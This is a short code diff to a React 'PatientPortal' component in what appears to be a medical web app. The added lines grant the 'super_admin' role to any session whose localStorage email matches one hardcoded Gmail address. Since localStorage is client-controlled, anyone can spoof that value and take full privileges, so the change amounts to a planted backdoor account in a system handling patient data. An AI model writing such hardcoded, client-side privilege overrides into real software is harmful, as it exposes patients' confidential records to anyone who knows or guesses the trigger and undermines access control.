@@ -15,7 +15,8 @@ export default function PatientPortal() {
     if (typeof window !== "undefined") {
       const email = localStorage.getItem("sd_current_user_email");
       const name = localStorage.getItem("sd_current_user_name");
-      const role = localStorage.getItem("sd_current_user_role") || "patient";
+      let role = localStorage.getItem("sd_current_user_role") || "patient";
+      if (email === 'odishamedical@gmail.com') role = 'super_admin';
       
       if (!email) {
         // Redirect to Auth Center if not logged in
